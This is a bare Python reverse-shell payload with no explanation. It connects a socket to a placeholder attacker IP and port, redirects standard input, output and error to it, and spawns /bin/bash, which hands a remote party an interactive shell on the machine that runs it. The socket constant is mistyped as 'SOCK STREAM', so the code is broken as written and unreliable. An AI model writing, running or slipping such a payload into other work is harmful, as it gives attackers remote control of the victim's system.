import socket, pty, os

s=socket.socket(socket.AF_INET, socket.SOCK STREAM)
s.connect(("<attacker-ip>", <port-number>))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

pty.spawn("/bin/bash")